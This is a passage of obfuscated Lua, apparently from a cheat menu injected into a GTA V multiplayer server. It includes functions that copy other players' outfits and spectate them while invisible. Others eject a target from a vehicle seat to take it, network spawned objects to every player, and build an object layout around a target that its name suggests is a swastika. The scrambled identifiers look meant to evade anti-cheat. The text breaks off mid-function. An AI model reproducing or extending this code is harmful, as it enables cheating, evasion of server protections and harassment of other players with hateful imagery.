		head_texture_JGRIEGHJERI = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 0)
		
		beard_drawable_HEHRTJYJYT = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 1)
		beard_palette = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 1)
		beard_texture_HTRJYTJTYJT = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 1)
		
		hair_drawable_HTRJTYKJTUK = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 2)
		hair_palette_JJJJJJJJ = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 2)
		hair_texture_POPOPOPOP = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 2)
		
		torso_drawable_FREJIUGHERU = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 3)
		torso_palette_GREHTRH = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 3)
		torso_texture_GREHTHRTJTY = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 3)
		
		legs_drawable_GERGREHETRHTRH = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 4)
		legs_palette_gEHTRTRR = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 4)
		legs_texture_PLOLKPLOLPPOL = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 4)
		
		hands_drawable_GRTHTRYJYT = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 5)
		hands_palette_HGRTHRHRTHR = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 5)
		hands_texture_HTIKOULUIKUI = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 5)
		
		foot_drawable_HTRYJTYJTYY = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 6)
		foot_palette_gRTHRRTDTDTER = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 6)
		foot_texture_GTHRTHRTHDT = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 6)
		
		acc1_drawable_NTRKJTYKTY = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 7)
		acc1_palette_HRTYJKTYUKTU = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 7)
		acc1_texture_HTEHRTHTFH = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 7)
		
		acc2_drawable_LKPLPOPLPL = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 8)
		acc2_palette_LOPKJIOJO = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 8)
		acc2_texture_GRETRHR = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 8)
		
		acc3_drawable_GREJGHRTBGRH = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 9)
		acc3_palette_GJRTIHKRTS = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 9)
		acc3_texture_GREGRHTHTR = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 9)
		
		mask_drawable_GETHRTEHDR = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 10)
		mask_palette_hRTHTRHTRYTHT = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 10)
		mask_texture_HTHRTHTFDTY = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 10)
		
		aux_drawable_GRTHRTHTDTR = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 11)
		aux_palette_GRTHRTHTRT = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 11) 	
		aux_texture_HREHESHTR = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 11)

		sritizen_INVOKE_PN(0x93376B65A266EB5F, me_hrejtrGFgre, 0, hat_trjtyrjkytkt, hat_texture_hgrehjrtjt, 1)
		sritizen_INVOKE_PN(0x93376B65A266EB5F, me_hrejtrGFgre, 1, glasses_htrkytrkyt, glasses_texture_RJRTJRRTJ, 1)
		sritizen_INVOKE_PN(0x93376B65A266EB5F, me_hrejtrGFgre, 2, eare_grehrehgregrrt, ear_texture_HREHRTHJTRJR, 1)
		sritizen_INVOKE_PN(0x93376B65A266EB5F, me_hrejtrGFgre, 6, watch_hETRTRT, watch_texture_HRTEJRYJYTJTY, 1)
		sritizen_INVOKE_PN(0x93376B65A266EB5F, me_hrejtrGFgre, 7, wrist_EHTRHRHJRJY, wrist_texture_HTRJRJYJTYU, 1)
		
		sritizen_INVOKE_PN(0x262B14F48D29DE80, me_hrejtrGFgre, 0, head_drawable_LGLGLKGKGKGKG, head_texture_JGRIEGHJERI, head_palette_JGRTJHJTHJTY)
		sritizen_INVOKE_PN(0x262B14F48D29DE80, me_hrejtrGFgre, 1, beard_drawable_HEHRTJYJYT, beard_texture_HTRJYTJTYJT, beard_palette)
		sritizen_INVOKE_PN(0x262B14F48D29DE80, me_hrejtrGFgre, 2, hair_drawable_HTRJTYKJTUK, hair_texture_POPOPOPOP, hair_palette_JJJJJJJJ)
		sritizen_INVOKE_PN(0x262B14F48D29DE80, me_hrejtrGFgre, 3, torso_drawable_FREJIUGHERU, torso_texture_GREHTHRTJTY, torso_palette_GREHTRH)
		sritizen_INVOKE_PN(0x262B14F48D29DE80, me_hrejtrGFgre, 4, legs_drawable_GERGREHETRHTRH, legs_texture_PLOLKPLOLPPOL, legs_palette_gEHTRTRR)
		sritizen_INVOKE_PN(0x262B14F48D29DE80, me_hrejtrGFgre, 5, hands_drawable_GRTHTRYJYT, hands_texture_HTIKOULUIKUI, hands_palette_HGRTHRHRTHR)
		sritizen_INVOKE_PN(0x262B14F48D29DE80, me_hrejtrGFgre, 6, foot_drawable_HTRYJTYJTYY, foot_texture_GTHRTHRTHDT, foot_palette_gRTHRRTDTDTER)
		sritizen_INVOKE_PN(0x262B14F48D29DE80, me_hrejtrGFgre, 7, acc1_drawable_NTRKJTYKTY, acc1_texture_HTEHRTHTFH, acc1_palette_HRTYJKTYUKTU)
		sritizen_INVOKE_PN(0x262B14F48D29DE80, me_hrejtrGFgre, 8, acc2_drawable_LKPLPOPLPL, acc2_texture_GRETRHR, acc2_palette_LOPKJIOJO)
		sritizen_INVOKE_PN(0x262B14F48D29DE80, me_hrejtrGFgre, 9, acc3_drawable_GREJGHRTBGRH, acc3_texture_GREGRHTHTR, acc3_palette_GJRTIHKRTS)
		sritizen_INVOKE_PN(0x262B14F48D29DE80, me_hrejtrGFgre, 10, mask_drawable_GETHRTEHDR, mask_texture_HTHRTHTFDTY, mask_palette_hRTHTRHTRYTHT)
		sritizen_INVOKE_PN(0x262B14F48D29DE80, me_hrejtrGFgre, 11, aux_drawable_GRTHRTHTDTR, aux_texture_HREHESHTR, aux_palette_GRTHRTHTRT)
	end
	
--[[local function print_player_outfit(Target_grejtjtrkyt)
		local ped_htrjkykutkiy = sritizen_INVOKE_PN(0x43A66C31C68491C0, Target_grejtjtrkyt)
		local me_hrejtrGFgre = sritizen_INVOKE_PN(0xD80958FC74E988A6)
		
		hat_trjtyrjkytkt = sritizen_INVOKE_PN(0x898CC20EA75BACD8, ped_htrjkykutkiy, 0)
		hat_texture_hgrehjrtjt = sritizen_INVOKE_PN(0xE131A28626F81AB2, ped_htrjkykutkiy, 0)
		
		glasses_htrkytrkyt = sritizen_INVOKE_PN(0x898CC20EA75BACD8, ped_htrjkykutkiy, 1)
		glasses_texture_RJRTJRRTJ = sritizen_INVOKE_PN(0xE131A28626F81AB2, ped_htrjkykutkiy, 1)
		
		eare_grehrehgregrrt = sritizen_INVOKE_PN(0x898CC20EA75BACD8, ped_htrjkykutkiy, 2)
		ear_texture_HREHRTHJTRJR = sritizen_INVOKE_PN(0xE131A28626F81AB2, ped_htrjkykutkiy, 2)
		
		watch_hETRTRT = sritizen_INVOKE_PN(0x898CC20EA75BACD8, ped_htrjkykutkiy, 6)
		watch_texture_HRTEJRYJYTJTY = sritizen_INVOKE_PN(0xE131A28626F81AB2, ped_htrjkykutkiy, 6)
		
		wrist_EHTRHRHJRJY = sritizen_INVOKE_PN(0x898CC20EA75BACD8, ped_htrjkykutkiy, 7)
		wrist_texture_HTRJRJYJTYU = sritizen_INVOKE_PN(0xE131A28626F81AB2, ped_htrjkykutkiy, 7)
		
		head_drawable_LGLGLKGKGKGKG = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 0)
		head_palette_JGRTJHJTHJTY = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 0)
		head_texture_JGRIEGHJERI = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 0)
		
		beard_drawable_HEHRTJYJYT = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 1)
		beard_palette = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 1)
		beard_texture_HTRJYTJTYJT = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 1)
		
		hair_drawable_HTRJTYKJTUK = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 2)
		hair_palette_JJJJJJJJ = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 2)
		hair_texture_POPOPOPOP = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 2)
		
		torso_drawable_FREJIUGHERU = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 3)
		torso_palette_GREHTRH = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 3)
		torso_texture_GREHTHRTJTY = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 3)
		
		legs_drawable_GERGREHETRHTRH = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 4)
		legs_palette_gEHTRTRR = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 4)
		legs_texture_PLOLKPLOLPPOL = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 4)
		
		hands_drawable_GRTHTRYJYT = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 5)
		hands_palette_HGRTHRHRTHR = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 5)
		hands_texture_HTIKOULUIKUI = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 5)
		
		foot_drawable_HTRYJTYJTYY = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 6)
		foot_palette_gRTHRRTDTDTER = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 6)
		foot_texture_GTHRTHRTHDT = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 6)
		
		acc1_drawable_NTRKJTYKTY = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 7)
		acc1_palette_HRTYJKTYUKTU = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 7)
		acc1_texture_HTEHRTHTFH = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 7)
		
		acc2_drawable_LKPLPOPLPL = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 8)
		acc2_palette_LOPKJIOJO = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 8)
		acc2_texture_GRETRHR = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 8)
		
		acc3_drawable_GREJGHRTBGRH = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 9)
		acc3_palette_GJRTIHKRTS = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 9)
		acc3_texture_GREGRHTHTR = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 9)
		
		mask_drawable_GETHRTEHDR = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 10)
		mask_palette_hRTHTRHTRYTHT = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 10)
		mask_texture_HTHRTHTFDTY = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 10)
		
		aux_drawable_GRTHRTHTDTR = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 11)
		aux_palette_GRTHRTHTRT = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 11) 	
		aux_texture_HREHESHTR = sritizen_INVOKE_PN(0x04A355E041E004E6, ped_htrjkykutkiy, 11)
		
		print("HATS: ", hat_trjtyrjkytkt, hat_texture_hgrehjrtjt)
		print("GLASSES: ", glasses_htrkytrkyt, glasses_texture_RJRTJRRTJ)
		print("EARS", eare_grehrehgregrrt, ear_texture_HREHRTHJTRJR)
		
		print("FACE: ", head_drawable_LGLGLKGKGKGKG, head_texture_JGRIEGHJERI)
		print("MASK: ", beard_drawable_HEHRTJYJYT, beard_texture_HTRJYTJTYJT)
		print("HAIR: ", hair_drawable_HTRJTYKJTUK, hair_texture_POPOPOPOP)
		print("TORSO: ", torso_drawable_FREJIUGHERU, torso_texture_GREHTHRTJTY)
		print("LEGS: ", legs_drawable_GERGREHETRHTRH, legs_texture_PLOLKPLOLPPOL)
		print("HANDS: : ", hands_drawable_GRTHTRYJYT, hands_texture_HTIKOULUIKUI)
		print("SHOES: ", foot_drawable_HTRYJTYJTYY, foot_texture_GTHRTHRTHDT)
		print("SPECIAL1: ", acc1_drawable_NTRKJTYKTY, acc1_texture_HTEHRTHTFH)
		print("SPECIAL2: ", acc2_drawable_LKPLPOPLPL, acc2_texture_GRETRHR)
		print("SPECIAL3: ", acc3_drawable_GREJGHRTBGRH, acc3_texture_GREGRHTHTR)
		print("TEXTURE: ", mask_drawable_GETHRTEHDR, mask_texture_HTHRTHTFDTY)
		print("TORSO2: ", aux_drawable_GRTHRTHTDTR, aux_texture_HREHESHTR)
end]]
	
local function ResetAppearance_PN_DSUGHSDIGHSD()
	sritizen_INVOKE_PN(0xCD8A7537A9B52F06, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1))
	sritizen_INVOKE_PN(0x0E5173C163976E38, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1))
	sritizen_INVOKE_PN(0x262B14F48D29DE80, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), 1, 0, 0, 0)
	sritizen_INVOKE_PN(0x262B14F48D29DE80, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), 5, 0, 0, 0)
	sritizen_INVOKE_PN(0x262B14F48D29DE80, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), 9, 0, 0, 0)
end
	
local function ChangeAppearance_PN_ASUHGIUDSHGSD(family_SDGIUSDOGJISDGSD, model_DSIGHODSIGSD, texture_DASIGHDSUGSD)
	if (family_SDGIUSDOGJISDGSD == 'HATS'or family_SDGIUSDOGJISDGSD == 'GLASSES'or family_SDGIUSDOGJISDGSD == 'EARS') then
		if (family_SDGIUSDOGJISDGSD == 'HATS') then
			fam_DUHSGOSDIUGIHOSDG = 0
		elseif (family_SDGIUSDOGJISDGSD == 'GLASSES') then
			fam_DUHSGOSDIUGIHOSDG = 1
		elseif (family_SDGIUSDOGJISDGSD == 'EARS') then
			fam_DUHSGOSDIUGIHOSDG = 2
		end
		sritizen_INVOKE_PN(0x93376B65A266EB5F, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), fam_DUHSGOSDIUGIHOSDG, model_DSIGHODSIGSD - 1, texture_DASIGHDSUGSD, 1)
	else
		if (family_SDGIUSDOGJISDGSD == 'FACE') then
			fam_DUHSGOSDIUGIHOSDG = 0
		elseif (family_SDGIUSDOGJISDGSD == 'MASK') then
			fam_DUHSGOSDIUGIHOSDG = 1
		elseif (family_SDGIUSDOGJISDGSD == 'HAIR') then
			fam_DUHSGOSDIUGIHOSDG = 2
		elseif (family_SDGIUSDOGJISDGSD == 'TORSO') then
			fam_DUHSGOSDIUGIHOSDG = 3
		elseif (family_SDGIUSDOGJISDGSD == 'LEGS') then
			fam_DUHSGOSDIUGIHOSDG = 4
		elseif (family_SDGIUSDOGJISDGSD == 'HANDS') then
			fam_DUHSGOSDIUGIHOSDG = 5
		elseif (family_SDGIUSDOGJISDGSD == 'SHOES') then
			fam_DUHSGOSDIUGIHOSDG = 6
		elseif (family_SDGIUSDOGJISDGSD == 'SPECIAL1') then
			fam_DUHSGOSDIUGIHOSDG = 7
		elseif (family_SDGIUSDOGJISDGSD == 'SPECIAL2') then
			fam_DUHSGOSDIUGIHOSDG = 8
		elseif (family_SDGIUSDOGJISDGSD == 'SPECIAL3') then
			fam_DUHSGOSDIUGIHOSDG = 9
		elseif (family_SDGIUSDOGJISDGSD == 'TEXTURE') then
			fam_DUHSGOSDIUGIHOSDG = 10
		elseif (family_SDGIUSDOGJISDGSD == 'TORSO2') then
			fam_DUHSGOSDIUGIHOSDG = 11
		end
		sritizen_INVOKE_PN(0x262B14F48D29DE80, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), fam_DUHSGOSDIUGIHOSDG, model_DSIGHODSIGSD, texture_DASIGHDSUGSD, 0)
	end
end

local polar_SDGHSDIUGSDGSD, azimuth_DSGHSDIUGDSGSD = 0, 90

local function Spectateplejerhasztag2_UD_PN(player_diuhfsiddfsg)
if SavedCoords_UDHGIUHFUDGDFG == nil then
SavedCoords_UDHGIUHFUDGDFG = GetEntityCoords_PN_UDHGIUDIKGDFG(sritizen_INVOKE_PN(0xD80958FC74E988A6))
end
CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
player_global_UDHFUYDSHFIGUFDG = player_diuhfsiddfsg
if spectate_global_dugsuydhkgsdfgdf then
local enstrititi = sritizen_INVOKE_PN(0x997ABD671D25CA0B, sritizen_INVOKE_PN(0xD80958FC74E988A6), false) and sritizen_INVOKE_PN(0x6094AD011A2EA87D, sritizen_INVOKE_PN(0xD80958FC74E988A6)) or sritizen_INVOKE_PN(0xD80958FC74E988A6)
spectate_global_dugsuydhkgsdfgdf = false
Niewidka31da_PN = false
PN_WAIT_31DA31_PN(100)
sritizen_INVOKE_PN(0x06843DA7060A026B, sritizen_INVOKE_PN(0xD80958FC74E988A6), SavedCoords_UDHGIUHFUDGDFG)
PN_WAIT_31DA31_PN(10)
SavedCoords_UDHGIUHFUDGDFG = nil
else
spectate_global_dugsuydhkgsdfgdf = true
Niewidka31da_PN = true
end
end)
end


local function Polar3DToWorld_DSGIDSIUGHSDGS(entityPosition_DSIGHIUSDGSDG, radius_DSGIHSIUDGSDG, polarAngleDeg_DSGHSDIUGSDG, azimuthAngleDeg_DSGIHSDIGDSG)
    local polarAngleRad_DSGIUSDIGISDG = polarAngleDeg_DSGHSDIUGSDG * math.pi / 180.0
    local azimuthAngleRad_SDIGDSIUGSDG = azimuthAngleDeg_DSGIHSDIGDSG * math.pi / 180.0

    return {
        x = entityPosition_DSIGHIUSDGSDG.x + radius_DSGIHSIUDGSDG * (math.sin(azimuthAngleRad_SDIGDSIUGSDG) * math.cos(polarAngleRad_DSGIUSDIGISDG)),
        y = entityPosition_DSIGHIUSDGSDG.y - radius_DSGIHSIUDGSDG * (math.sin(azimuthAngleRad_SDIGDSIUGSDG) * math.sin(polarAngleRad_DSGIUSDIGISDG)),
        z = entityPosition_DSIGHIUSDGSDG.z - radius_DSGIHSIUDGSDG * math.cos(azimuthAngleRad_SDIGDSIUGSDG)
    }
end


local function Szybkazamiana31da0_PN(player_diuhfsiddfsg)
CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
local ped_udfyugsyfdsg = sritizen_INVOKE_PN(0x43A66C31C68491C0, player_diuhfsiddfsg)
local vehicle_UDHUHDFSGDFG = GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(ped_udfyugsyfdsg, 0)
local free_seat_IDYGIUFGDFG = false
if vehicle_UDHUHDFSGDFG ~= 0 then

if GetPedInVehicleSeat_PN_USDGFUYDSFSD(vehicle_UDHUHDFSGDFG, -1) ~= 0 then
sritizen_INVOKE_PN(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
PN_WAIT_31DA31_PN(10)
while not free_seat_IDYGIUFGDFG do
if IsVehicleSeatFree_PN_DUHGYUSFGFD(vehicle_UDHUHDFSGDFG, -1) then
sritizen_INVOKE_PN(vehicle_UDHUHDFSGDFG, -1)
free_seat_IDYGIUFGDFG = true
SKLONUJTYPKA313Q_PN(zaznaczonygracz31_PN)
sritizen_INVOKE_PN(0xF75B0D629E1C063D, sritizen_INVOKE_PN(0xD80958FC74E988A6), vehicle_UDHUHDFSGDFG, -1)
else
PN_WAIT_31DA31_PN(0)
end
end
elseif GetPedInVehicleSeat_PN_USDGFUYDSFSD(vehicle_UDHUHDFSGDFG, 0) ~= 0 then
sritizen_INVOKE_PN(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
PN_WAIT_31DA31_PN(10)
while not free_seat_IDYGIUFGDFG do
if IsVehicleSeatFree_PN_DUHGYUSFGFD(vehicle_UDHUHDFSGDFG, 0) then
sritizen_INVOKE_PN(vehicle_UDHUHDFSGDFG, 0)
free_seat_IDYGIUFGDFG = true
SKLONUJTYPKA313Q_PN(zaznaczonygracz31_PN)
sritizen_INVOKE_PN(0xF75B0D629E1C063D, sritizen_INVOKE_PN(0xD80958FC74E988A6), vehicle_UDHUHDFSGDFG, 0)
else
PN_WAIT_31DA31_PN(0)
end
end
elseif GetPedInVehicleSeat_PN_USDGFUYDSFSD(vehicle_UDHUHDFSGDFG, 1) ~= 0 then
sritizen_INVOKE_PN(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
PN_WAIT_31DA31_PN(10)
while not free_seat_IDYGIUFGDFG do
if IsVehicleSeatFree_PN_DUHGYUSFGFD(vehicle_UDHUHDFSGDFG, 1) then
sritizen_INVOKE_PN(vehicle_UDHUHDFSGDFG, 1)
free_seat_IDYGIUFGDFG = true
SKLONUJTYPKA313Q_PN(zaznaczonygracz31_PN)
sritizen_INVOKE_PN(0xF75B0D629E1C063D, sritizen_INVOKE_PN(0xD80958FC74E988A6), vehicle_UDHUHDFSGDFG, 1)
else
PN_WAIT_31DA31_PN(0)
end
end
elseif GetPedInVehicleSeat_PN_USDGFUYDSFSD(vehicle_UDHUHDFSGDFG, 2) ~= 0 then
sritizen_INVOKE_PN(0xAAA34F8A7CB32098, ped_udfyugsyfdsg)
PN_WAIT_31DA31_PN(10)
while not free_seat_IDYGIUFGDFG do
if IsVehicleSeatFree_PN_DUHGYUSFGFD(vehicle_UDHUHDFSGDFG, 2) then
sritizen_INVOKE_PN(vehicle_UDHUHDFSGDFG, 2)
free_seat_IDYGIUFGDFG = true
SKLONUJTYPKA313Q_PN(zaznaczonygracz31_PN)
sritizen_INVOKE_PN(0xF75B0D629E1C063D, sritizen_INVOKE_PN(0xD80958FC74E988A6), vehicle_UDHUHDFSGDFG, 2)
else
PN_WAIT_31DA31_PN(0)
end
end
else
JEBNIJpowiadomieni31_PN("Can't to find player seat or player not in vehicle")
end
else
JEBNIJpowiadomieni31_PN("Player must be in vehicle")
end
end)
end

local function RequestModelSync_SDUFHSIDGSDG(model_DSIGHODSIGSD, timeout_DSIUFHISDGSDG)
        timeout_DSIUFHISDGSDG = timeout_DSIUFHISDGSDG or 2500
        local counter_DSGIHSDIUGJDSGDS = 0
        sritizen_INVOKE_PN(0x963D27A58DF860AC, sritizen_INVOKE_PN(0xD24D37CC275948CC, model_DSIGHODSIGSD))

        while not sritizen_INVOKE_PN(0x98A4EB5D89A0C952, sritizen_INVOKE_PN(0xD24D37CC275948CC, model_DSIGHODSIGSD)) do
            sritizen_INVOKE_PN(0x963D27A58DF860AC, model_DSIGHODSIGSD)
            counter_DSGIHSDIUGJDSGDS = counter_DSGIHSDIUGJDSGDS + 100
            PN_WAIT_31DA31_PN(0)
            if counter_DSGIHSDIUGJDSGDS >= timeout_DSIUFHISDGSDG then return false end
        end

        return true
    end
	
local function changemodeel31qda_PN(model)			
	local hash_SDGHISDGDS = sritizen_INVOKE_PN(0xD24D37CC275948CC, tostring(model))
	local player_SDIGJOSIDGSD = sritizen_INVOKE_PN(0x4F8644AF03D0E0D6)
				
    RequestModelSync_SDUFHSIDGSDG(tostring(model))

    sritizen_INVOKE_PN(0x00A1CADD00108836, player_SDIGJOSIDGSD, hash_SDGHISDGDS)
	sritizen_INVOKE_PN(0x262B14F48D29DE80, sritizen_INVOKE_PN(0x43A66C31C68491C0, -1), 0, i_DSDSGUSHDIUGSD, 0, 0)
    sritizen_INVOKE_PN(0xE532F5D78798DAAB, hash_SDGHISDGDS)
end
	
local function DoNetwork_DSIGHISUDGSDG(obj_DSUHGISDUGSDG)
        if not sritizen_INVOKE_PN(0x7239B21A38F536BA, obj_DSUHGISDUGSDG) then return end
        local id_DSGUHISUDGSDG = sritizen_INVOKE_PN(0x99BFDC94A603E541, obj_DSUHGISDUGSDG)
        sritizen_INVOKE_PN(0x2B1813ABA29016C5, id_DSGUHISUDGSDG, true)
        sritizen_INVOKE_PN(0xE05E81A888FA63C8, id_DSGUHISUDGSDG, true)
        sritizen_INVOKE_PN(0x299EEB23175895FC, id_DSGUHISUDGSDG, false)

        for _, src_DSHGIUDSGSDG in pairs(GetActivePlayers_PN_UDGYUDFIGKDFGDF()) do
            sritizen_INVOKE_PN(0xA8A024587329F36A, id_DSGUHISUDGSDG, src_DSHGIUDSGSDG, true)
        end
    end

local function spawnowaniesfastiki31_PN(ent_DSIUHGIUSDGDS, offZ_SDGUSDIGSD)

                CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
                    local where_DSUGHSIDUGSDG = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(ent_DSIUHGIUSDGDS, 0.0, 0.0, 0.0)

                    if not sritizen_INVOKE_PN(0x524AC5ECEA15343E, ent_DSIUHGIUSDGDS) then
                        where_DSUGHSIDUGSDG = vector3(where_DSUGHSIDUGSDG.x, where_DSUGHSIDUGSDG.y, where_DSUGHSIDUGSDG.z + 5.0)
                    end

                    if offZ_SDGUSDIGSD then
                        where_DSUGHSIDUGSDG = vector3(where_DSUGHSIDUGSDG.x, where_DSUGHSIDUGSDG.y, where_DSUGHSIDUGSDG.z + offZ_SDGUSDIGSD)
                    end

                    local column_SJGHISDUGSDDSG = {
                        ["up"] = {},
                        ["across"] = {}
                    }

                    for i_SDGUIHSDUGSD = 0, 7 do
                        column_SJGHISDUGSDDSG["up"][i_SDGUIHSDUGSD + 1] = {
                            x_DSUHGISDG = 0.0,
                            y_DSUHGISDG = 0.0,
                            z_DSIHGSDGDSSDUHI = 1.0 + (2.6 * (i_SDGUIHSDUGSD + 1)),
                            _p_SDDSIHUGISDGSD = 90.0,
                            _y_SDDSIHUGISDGSD = 0.0,
                            _r_DSIGUHUSDIGSD = 0.0
                        }
                    end

                    for i_SDGUIHSDUGSD = 0, 8 do
                        column_SJGHISDUGSDDSG["across"][i_SDGUIHSDUGSD + 1] = {
                            x_DSUHGISDG = 10.4 + (-2.6 * i_SDGUIHSDUGSD),
                            y_DSUHGISDG = 0.0,
                            z_DSIHGSDGDSSDUHI = 11.6,
                            _p_SDDSIHUGISDGSD = 90.0,
                            _y_SDDSIHUGISDGSD = 0.0,
                            _r_DSIGUHUSDIGSD = 0.0
                        }
                    end

                    local arms_DSIGJSDGSDG = {
                        ["bottom_right"] = {},
                        ["across_up"] = {},
                        ["top_left"] = {},
                        ["across_down"] = {}
                    }

                    for i_SDGUIHSDUGSD = 0, 4 do
                        arms_DSIGJSDGSDG["bottom_right"][i_SDGUIHSDUGSD] = {
                            x_DSUHGISDG = -2.6 * i_SDGUIHSDUGSD,
                            y_DSUHGISDG = 0.0,
                            z_DSIHGSDGDSSDUHI = 1.0,
                            _p_SDDSIHUGISDGSD = 90.0,
                            _y_SDDSIHUGISDGSD = 0.0,
                            _r_DSIGUHUSDIGSD = 0.0
                        }

                        arms_DSIGJSDGSDG["top_left"][i_SDGUIHSDUGSD] = {
                            x_DSUHGISDG = 2.6 * i_SDGUIHSDUGSD,
                            y_DSUHGISDG = 0.0,
                            z_DSIHGSDGDSSDUHI = 22.2,
                            _p_SDDSIHUGISDGSD = 90.0,
                            _y_SDDSIHUGISDGSD = 0.0,
                            _r_DSIGUHUSDIGSD = 0.0
                        }

                        arms_DSIGJSDGSDG["across_down"][i_SDGUIHSDUGSD + 1] = {
                            x_DSUHGISDG = 10.4,
                            y_DSUHGISDG = 0.0,
                            z_DSIHGSDGDSSDUHI = 12.6 - (2.25 * (i_SDGUIHSDUGSD + 1)),
                            _p_SDDSIHUGISDGSD = 90.0,
                            _y_SDDSIHUGISDGSD = 0.0,
                            _r_DSIGUHUSDIGSD = 0.0
                        }
                    end

                    for i_SDGUIHSDUGSD = 0, 3 do
                        arms_DSIGJSDGSDG["across_up"][i_SDGUIHSDUGSD + 1] = {
